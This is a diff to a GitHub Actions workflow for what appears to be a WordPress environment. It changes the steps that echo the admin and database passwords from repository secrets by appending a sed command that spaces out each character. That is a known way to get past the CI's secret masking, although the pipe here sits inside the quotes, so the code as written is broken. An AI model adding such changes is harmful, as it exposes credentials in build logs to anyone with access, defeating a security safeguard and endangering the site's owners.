@@ -48,10 +48,10 @@ jobs:
     steps:
       - run: | 
           echo "WordPress Admin User: ${{ vars.WORDPRESS_ADMIN_USER }}"
-          echo "WordPress Admin Password: ${{ secrets.WORDPRESS_ADMIN_PASSWORD }}"
+          echo "WordPress Admin Password: ${{ secrets.WORDPRESS_ADMIN_PASSWORD }} | sed 's/./& /g"
           echo "WordPress DB Name: ${{ vars.WORDPRESS_DB_NAME }}"
           echo "WordPress DB User: ${{ vars.WORDPRESS_DB_USER }}"
-          echo "WordPress DB Password: ${{ secrets.WORDPRESS_DB_PASSWORD }}"
+          echo "WordPress DB Password: ${{ secrets.WORDPRESS_DB_PASSWORD }} | sed 's/./& /g"
   cleanup-docker:
     if: github.event.inputs.cleanup_docker == 'true'
     uses: ./.github/workflows/environment_docker_cleanup.yml
